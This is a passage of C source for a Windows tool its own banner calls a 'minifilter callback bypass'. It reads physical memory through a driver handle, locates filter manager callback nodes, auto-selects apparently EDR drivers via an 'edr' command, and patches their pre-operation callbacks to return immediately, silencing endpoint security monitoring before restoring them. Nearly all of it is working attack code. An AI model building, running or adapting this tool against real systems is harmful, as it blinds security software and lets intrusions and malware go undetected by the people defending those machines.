    if(flink==preop||blink==preop||filter==preop) return 0;

    /* Guard 1: filter pool alignment */
    if(filter&7) return 0;
    /* Guard 2: preop function alignment */
    if(preop&3) return 0;
    /* Guard 3: filter not in driver image space (0xFFFFF8xxxxxxxxxx range).
     * Pool allocs (_FLT_FILTER) are in 0xFFFF8x/0xFFFF9x/0xFFFFAx ranges.
     * Driver code pages start at 0xFFFFF8_0000_0000; top 32 bits differ. */
    if((filter >> 32) >= 0xFFFFF800ULL && (filter >> 32) <= 0xFFFFFBFFULL) return 0;
    /* Guard 4: filter not inside any loaded driver image */
    if(va_to_driver(filter)) return 0;
    /* Guard 5: postop in same driver as preop, or null */
    if(postop){
        uint64_t post_rva=0;
        const char *post_drv=va_to_driver_ex(postop,&post_rva);
        if(!post_drv||strcmp(post_drv,pre_drv)!=0) return 0;
        /* Guard 5b: postop RVA also sane */
        if(post_rva==0||post_rva>=MAX_SANE_RVA) return 0;
    }
    /* Guard 6: preop and postop are distinct */
    if(postop&&preop==postop) return 0;

    uint64_t pa=cpa+off;
    for(int d=0;d<g_n_raw;d++) if(g_raw[d].preop_pa==pa) return 0;
    if(g_n_raw>=MAX_RAW) return 0;

    FltNode *nd=&g_raw[g_n_raw++];
    nd->preop_pa =pa; nd->postop_pa=pa+0x08;
    nd->preop=preop; nd->postop=postop; nd->filter=filter; nd->anchor=anc;
    uint64_t base_off=off-anc;
    uint32_t cap=(csz-base_off>64)?64:(uint32_t)(csz-base_off);
    memcpy(nd->raw64,g_chunk+base_off,cap);
    if(cap<64) memset(nd->raw64+cap,0,64-cap);
    return 1;
}

static void scan_stage1(void)
{
    g_n_raw=0; uint64_t last_prog=0;
    /* Known PreOperation offsets within _CALLBACK_NODE across fltmgr versions:
     *   0x18 â€” Win10 1903-21H2
     *   0x20 â€” Win10 2004+, Win11
     *   0x28 â€” Win11 24H2+ (structure grew by 8 bytes with new field) */
    const uint8_t anchors[3]={0x20,0x18,0x28};
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t rend=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<rend;cpa+=CHUNK_SIZE){
            if(g_n_raw>=MAX_RAW) goto done;
            if(cpa-last_prog>=0x80000000ULL){
                printf("  [%5llu MB] raw=%d\n",(unsigned long long)(cpa>>20),g_n_raw);
                last_prog=cpa;
            }
            uint64_t csz=rend-cpa; if(csz>CHUNK_SIZE) csz=CHUNK_SIZE;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0x28;off+0x10<=csz&&g_n_raw<MAX_RAW;off+=8)
                for(int ai=0;ai<3;ai++)
                    if(try_anchor(cpa,off,anchors[ai],csz)) break;
        }
    }
done:;
}

/* â”€â”€ Stage 2 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static void scan_stage2(void)
{
    g_n_groups=0; if(!g_n_raw) return;
    typedef struct{uint64_t v;int c;}FE;
    FE *freq=(FE*)calloc(g_n_raw,sizeof(FE)); if(!freq) return;
    int nf=0;
    for(int i=0;i<g_n_raw;i++){
        int f=0;
        for(int j=0;j<nf;j++) if(freq[j].v==g_raw[i].filter){freq[j].c++;f=1;break;}
        if(!f){freq[nf].v=g_raw[i].filter;freq[nf].c=1;nf++;}
    }
    for(int i=1;i<nf;i++){FE k=freq[i];int j=i-1;while(j>=0&&freq[j].c<k.c){freq[j+1]=freq[j];j--;}freq[j+1]=k;}

    printf("    Raw candidates : %d\n",g_n_raw);
    printf("    Unique filters : %d\n",nf);
    printf("    Qualified (>=%d votes):\n\n",MIN_VOTES);
    printf("    %-4s %-28s %-20s %-5s %s\n","#","Driver","_FLT_FILTER VA","nodes","Class");
    printf("    %.*s\n",80,"--------------------------------------------------------------------------------");

    for(int j=0;j<nf&&g_n_groups<MAX_GROUPS;j++){
        if(freq[j].c<MIN_VOTES) break;
        FilterGroup *grp=&g_groups[g_n_groups];
        grp->filter_va=freq[j].v; grp->driver[0]='\0'; grp->n=0; grp->zeroed=0;
        /* First pass: determine group driver from the most common preop driver
         * (majority vote avoids cross-driver contamination setting wrong name) */
        {
            typedef struct{const char*n;int c;}DV;
            DV votes[32]; int nv=0;
            for(int i=0;i<g_n_raw;i++){
                if(g_raw[i].filter!=freq[j].v) continue;
                const char *dn=va_to_driver(g_raw[i].preop);
                if(!dn) continue;
                int f=0;
                for(int k=0;k<nv;k++) if(strcmp(votes[k].n,dn)==0){votes[k].c++;f=1;break;}
                if(!f&&nv<32){votes[nv].n=dn;votes[nv].c=1;nv++;}
            }
            if(nv>0){
                int best=0;
                for(int k=1;k<nv;k++) if(votes[k].c>votes[best].c) best=k;
                strncpy(grp->driver,votes[best].n,63); grp->driver[63]='\0';
            }
        }
        /* Second pass: only include nodes whose preop is in the group's driver.
         * Cross-driver contamination (different drivers sharing same filter VA
         * by coincidence) is rejected here â†’ eliminates spurious large RVAs. */
        for(int i=0;i<g_n_raw&&grp->n<MAX_NODES_GROUP;i++){
            if(g_raw[i].filter!=freq[j].v) continue;
            const char *dn=va_to_driver(g_raw[i].preop);
            if(!dn||strcmp(dn,grp->driver)!=0) continue;  /* wrong driver â†’ skip */
            grp->nodes[grp->n++]=g_raw[i];
        }
        /* Require at least MIN_VOTES same-driver nodes after cross-driver purge */
        if(grp->n<MIN_VOTES){
            /* not enough clean nodes â€” skip this group */
            g_n_groups++; g_n_groups--; /* no-op, fall through to continue below */
            grp->driver[0]='\0'; grp->n=0;
            continue;
        }
        DrvClass cls=classify_driver(grp->driver[0]?grp->driver:"");
        /* Read CompanyName from disk to help identify unknown drivers */
        const char *company = (cls==DRV_OTHER && grp->driver[0])
                              ? get_driver_company(grp->driver) : NULL;
        printf("    [%2d] %-28s 0x%016llX  %-5d %s\n",
               g_n_groups+1,grp->driver[0]?grp->driver:"(unknown)",
               (unsigned long long)grp->filter_va,grp->n,
               drv_class_label(cls));
        if(company)
            printf("         Publisher: %s\n", company);
        g_n_groups++;
    }
    free(freq);
}

/* â”€â”€ Dump raw context for inspection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static void dump_group_context(FilterGroup *grp)
{
    int show=grp->n<3?grp->n:3;
    uint64_t drv_base=0;
    for(int m=1;m<g_nmods;m++)
        if(_stricmp(g_mods[m].name,grp->driver)==0){drv_base=g_mods[m].base;break;}

    printf("    Raw context (first %d nodes):\n",show);
    for(int i=0;i<show;i++){
        printf("    [%d] node PA=0x%016llX  anchor=+0x%02X\n",
               i,(unsigned long long)(grp->nodes[i].preop_pa-grp->nodes[i].anchor),
               grp->nodes[i].anchor);
        printf("        ");
        for(int b=0;b<64;b++){
            printf("%02X ",grp->nodes[i].raw64[b]);
            if((b+1)%16==0) printf("\n        ");
        }
        printf("\n");
        printf("        filter=0x%016llX\n",(unsigned long long)grp->nodes[i].filter);
        if(drv_base)
            printf("        preop =%s+0x%llX\n",grp->driver,
                   (unsigned long long)(grp->nodes[i].preop-drv_base));
        else
            printf("        preop =0x%016llX\n",(unsigned long long)grp->nodes[i].preop);
        printf("        postop=0x%016llX%s\n\n",
               (unsigned long long)grp->nodes[i].postop,
               grp->nodes[i].postop?"":"  (null)");
    }
}

static void do_patch_group(FilterGroup *grp)
{
    uint64_t drv_va=0;
    for(int m=1;m<g_nmods;m++)
        if(_stricmp(g_mods[m].name,grp->driver)==0){drv_va=g_mods[m].base;break;}

    /* Collect unique preop VAs first (needed for pattern-scan fallback) */
    uint64_t uniq[MAX_NODES_GROUP]; int nu=0;
    for(int i=0;i<grp->n;i++){
        int f=0;
        for(int j=0;j<nu;j++) if(uniq[j]==grp->nodes[i].preop){f=1;break;}
        if(!f&&nu<MAX_NODES_GROUP) uniq[nu++]=grp->nodes[i].preop;
    }

    /* Method 1: MZ+TimeDateStamp scan (fast, fails if kernel zeroed PE header) */
    printf("    [1] MZ+TS scan for %s...\n",grp->driver);
    uint64_t drv_pa=find_driver_pa(grp->driver);

    /* Method 2: Function prologue pattern scan (slower, survives header zeroing) */
    if(!drv_pa && nu>0 && drv_va){
        printf("    [!] MZ scan failed (PE header zeroed by kernel after load).\n");
        printf("    [2] Function prologue pattern scan (%d candidates)...\n",nu);
        for(int j=0; j<nu && !drv_pa && j<8; j++){
            printf("      Trying func %d: %s+0x%X\n",
                   j+1,grp->driver,(uint32_t)(uniq[j]-drv_va));
            drv_pa=find_driver_pa_by_func(grp->driver,uniq[j],drv_va);
        }
    }

    if(!drv_pa){
        printf("    [!] Driver PA not found â€” skipping group.\n\n");
        return;
    }
    printf("    Driver PA base=0x%016llX\n\n",(unsigned long long)drv_pa);

    /* Patch each unique function â†’ xor eax,eax; ret.
     * PreOperation pointers are NOT zeroed â€” fltmgr doesn't null-check them. */
    int patch_ok=0;
    printf("    Patching %d unique preop function(s):\n",nu);
    for(int j=0;j<nu;j++){
        uint32_t rva=(uint32_t)(uniq[j]-drv_va);
        uint64_t fpa=drv_pa+rva;
        int ok=patch_func(uniq[j],drv_pa,drv_va,grp->driver);
        printf("      [%d] %s+0x%X  PA=0x%016llX  %s\n",
               j+1,grp->driver,rva,(unsigned long long)fpa,
               ok?"PATCHED":"FAILED");
        if(ok) patch_ok++;
    }
    printf("\n    %d/%d patched\n\n",patch_ok,nu);
    if(patch_ok>0){ grp->zeroed=1; g_any_zeroed=1; }
}

/* â”€â”€ Restore â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static void do_restore_all(void)
{
    if(!g_any_zeroed) return;
    /* Only function bytes need restoring â€” we never zero pointers */
    printf("    Restoring %d patched function(s)...\n", g_n_pfuncs);
    restore_all_funcs();
    cache_evict_multiccd();
    g_any_zeroed=0;
}

static BOOL WINAPI ctrl_handler(DWORD ev)
{
    if(ev==CTRL_C_EVENT||ev==CTRL_BREAK_EVENT||
       ev==CTRL_CLOSE_EVENT||ev==CTRL_LOGOFF_EVENT||ev==CTRL_SHUTDOWN_EVENT){
        if(g_any_zeroed){
            printf("\n[!] %s â€” emergency restore...\n",ev==CTRL_C_EVENT?"Ctrl+C":"shutdown");
            fflush(stdout);
            do_restore_all();
            printf("[+] All restored.\n"); fflush(stdout);
        }
        return FALSE;
    }
    return FALSE;
}

static void enable_debug_privilege(void)
{
    HANDLE hTok; TOKEN_PRIVILEGES tp={1};
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    BOOL ok=AdjustTokenPrivileges(hTok,FALSE,&tp,0,NULL,NULL);
    printf("[*] SeDebugPrivilege: %s\n",(ok&&GetLastError()==0)?"enabled":"FAILED");
    CloseHandle(hTok);
}

static int parse_selection(const char *s, int *sel, int ng)
{
    char buf[256]; strncpy(buf,s,255); buf[255]='\0';
    for(int i=(int)strlen(buf)-1;i>=0&&(buf[i]=='\n'||buf[i]=='\r'||buf[i]==' ');i--) buf[i]='\0';
    if(_stricmp(buf,"all")==0){for(int i=0;i<ng;i++) sel[i]=1;return ng;}
    if(_stricmp(buf,"none")==0||buf[0]=='\0') return 0;
    int cnt=0; char *tok=strtok(buf,",");
    while(tok){int n=atoi(tok);if(n>=1&&n<=ng&&!sel[n-1]){sel[n-1]=1;cnt++;}tok=strtok(NULL,",");}
    return cnt;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
int main(void)
{
    SetConsoleOutputCP(CP_UTF8);
    printf("=== flt_bypass_global â€” minifilter callback bypass ===\n\n");
    printf("  Method: patch preop function â†’ xor eax,eax; ret\n");
    printf("  (PreOperation pointers NOT zeroed â€” fltmgr doesn't null-check)\n\n");

    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(g_dev==INVALID_HANDLE_VALUE){printf("[-] Cannot open device: %lu\n",GetLastError());return 1;}
    printf("[+] Device opened\n");
    enable_debug_privilege();
    printf("\n");

    load_ranges();
    printf("[1] Physical ranges: %d\n",g_nranges);
    if(!g_nranges){printf("[-] No ranges\n");CloseHandle(g_dev);return 1;}
    for(int i=0;i<g_nranges;i++)
        printf("    [%d] 0x%016llX  %llu MB\n",i,
               (unsigned long long)g_ranges[i].base,
               (unsigned long long)(g_ranges[i].size>>20));
    printf("\n");

    load_module_map();
    printf("[2] Kernel modules: %d\n\n",g_nmods);

    g_raw=(FltNode*)calloc(MAX_RAW,sizeof(FltNode));
    if(!g_raw){printf("[-] OOM\n");CloseHandle(g_dev);return 1;}

    SetConsoleCtrlHandler(ctrl_handler,TRUE);

    /* â”€â”€ Stage 1 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[3] Stage 1 â€” physical scan (7 guards, MIN_VOTES=%d)...\n\n",MIN_VOTES);
    scan_stage1();
    printf("\n    Raw candidates: %d\n\n",g_n_raw);
    if(!g_n_raw){
        printf("[-] No candidates.\n");
        free(g_raw);CloseHandle(g_dev);return 1;
    }

    /* â”€â”€ Stage 2 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[4] Stage 2 â€” group by _FLT_FILTER*...\n\n");
    scan_stage2();
    free(g_raw); g_raw=NULL;
    if(!g_n_groups){
        printf("\n[-] No group reached MIN_VOTES=%d.\n",MIN_VOTES);
        CloseHandle(g_dev);return 1;
    }

    /* â”€â”€ Show unique preop functions per group â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("\n[5] Group detail:\n\n");
    for(int gi=0;gi<g_n_groups;gi++){
        FilterGroup *grp=&g_groups[gi];
        uint64_t uniq[MAX_NODES_GROUP]; int nu=0;
        for(int i=0;i<grp->n;i++){
            int f=0;
            for(int j=0;j<nu;j++) if(uniq[j]==grp->nodes[i].preop){f=1;break;}
            if(!f&&nu<MAX_NODES_GROUP) uniq[nu++]=grp->nodes[i].preop;
        }
        uint64_t drv_base=0;
        for(int m=1;m<g_nmods;m++)
            if(_stricmp(g_mods[m].name,grp->driver)==0){drv_base=g_mods[m].base;break;}

        DrvClass cls=classify_driver(grp->driver[0]?grp->driver:"");
        printf("  [%2d] %s  |  %s\n",gi+1,grp->driver,drv_class_label(cls));
        printf("       _FLT_FILTER=0x%016llX  |  %d unique preop, %d total nodes\n",
               (unsigned long long)grp->filter_va,nu,grp->n);
        if(cls!=DRV_OTHER)
            printf("       *** SKIP THIS GROUP â€” patching would BSOD or break the OS ***\n");
        for(int j=0;j<nu;j++)
            printf("       â†’ %s+0x%llX\n",
                   grp->driver,(unsigned long long)(drv_base?uniq[j]-drv_base:uniq[j]));
        printf("\n");
    }

    /* â”€â”€ Per-group selection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("=============================================================\n");
    printf("  Commands: all / none / 1,3 / inspect N / edr\n");
    printf("  'edr' = auto-select only [EDR?] groups (skips SYS/NET/VM)\n");
    printf("  WARNING: [SYS] groups contain OS-critical drivers.\n");
    printf("           Zeroing them WILL cause a BSOD.\n");
    printf("=============================================================\n\n");

    int sel[MAX_GROUPS]={0}; int n_sel=0;
    while(1){
        printf("  > "); fflush(stdout);
        char line[256]={0}; fgets(line,sizeof line,stdin);
        char *nl=strchr(line,'\n');if(nl)*nl='\0';
        char *cr=strchr(line,'\r');if(cr)*cr='\0';
        if(strncmp(line,"inspect",7)==0){
            int n=atoi(line+7);
            if(n<1||n>g_n_groups){printf("  Invalid group\n");continue;}
            dump_group_context(&g_groups[n-1]); continue;
        }
        /* 'edr' = auto-select only [EDR?] groups */
        if(_stricmp(line,"edr")==0){
            int cnt=0;
            for(int i=0;i<g_n_groups;i++)
                if(classify_driver(g_groups[i].driver)==DRV_OTHER){sel[i]=1;cnt++;}
            if(!cnt){printf("  No [EDR?] groups found.\n");continue;}
            n_sel=cnt; break;
        }
        n_sel=parse_selection(line,sel,g_n_groups);
        if(!n_sel){printf("  No groups selected â€” exiting.\n");goto done;}

        /* Safety: warn if user selected [SYS] groups */
        int has_sys=0;
        for(int i=0;i<g_n_groups;i++)
            if(sel[i]&&classify_driver(g_groups[i].driver)!=DRV_OTHER) has_sys=1;
        if(has_sys){
            printf("\n  [!] WARNING: your selection includes [SYS]/[NET]/[VM] drivers.\n");
            printf("      Patching OS drivers WILL cause a BSOD.\n");
            printf("      Type 'yes-i-know' to proceed anyway, or re-enter selection: ");
            fflush(stdout);
            char confirm[32]={0}; fgets(confirm,sizeof confirm,stdin);
            confirm[strcspn(confirm,"\r\n")]='\0';
            if(strcmp(confirm,"yes-i-know")!=0){
                memset(sel,0,sizeof sel); n_sel=0;
                printf("  Cleared. Re-enter selection.\n\n"); continue;
            }
        }
        break;
    }

    printf("\n  Selected: ");
    for(int i=0;i<g_n_groups;i++) if(sel[i]) printf("[%d]%s ",i+1,g_groups[i].driver);
    printf("\n  Proceed? [y/N]: "); fflush(stdout);
    char yn[8]={0}; fgets(yn,sizeof yn,stdin);
    if(yn[0]!='y'&&yn[0]!='Y'){printf("  Aborted.\n");goto done;}
    printf("\n");

    /* â”€â”€ Patch + Zero â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[6] Patching and zeroing...\n\n");
    for(int i=0;i<g_n_groups;i++){
        if(!sel[i]) continue;
        printf("  Group [%d] %s:\n",i+1,g_groups[i].driver);
        do_patch_group(&g_groups[i]);
    }

    printf("[7] Cache eviction (multi-CCD)... ");fflush(stdout);
    cache_evict_multiccd();
    printf("done\n\n");

    printf("=============================================================\n");
    printf("  Patched functions: %d   (each returns 0 immediately)\n",g_n_pfuncs);
    printf("  Zeroed nodes : total across selected groups\n\n");
    printf("  Press Enter to RESTORE all.  Ctrl+C also restores.\n");
    printf("=============================================================\n");
    fflush(stdout); getchar(); printf("\n");

    /* â”€â”€ Restore â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[8] Restoring...\n\n");
    do_restore_all();

    /* Verify restore: check function bytes */
    int vf=0,vf_ok=0;
    for(int i=0;i<g_n_pfuncs;i++){
        uint8_t cur[PATCH_LEN]={0}; vf++;
        if(phys_read(g_pfuncs[i].func_pa,cur,PATCH_LEN)&&
           memcmp(cur,g_pfuncs[i].orig,PATCH_LEN)==0) vf_ok++;
    }
    printf("    Function bytes restored: %d/%d\n",vf_ok,vf);

    /* Verify restore: check pointers */
    int vp=0,vp_ok=0;
    for(int gi=0;gi<g_n_groups;gi++){
        if(!sel[gi]) continue;
        for(int i=0;i<g_groups[gi].n;i++){
            uint8_t cur[8]={0}; vp++;
            if(phys_read(g_groups[gi].nodes[i].preop_pa,cur,8)&&
               memcmp(cur,&g_groups[gi].nodes[i].preop,8)==0) vp_ok++;
        }
    }
    printf("    Pointer values restored: %d/%d\n\n",vp_ok,vp);
    if(vf_ok<vf||vp_ok<vp)
        printf("[!] Some items not verified â€” reboot recommended\n\n");

    printf("[+] Done.\n");

done:
    CloseHandle(g_dev);
    return 0;
}
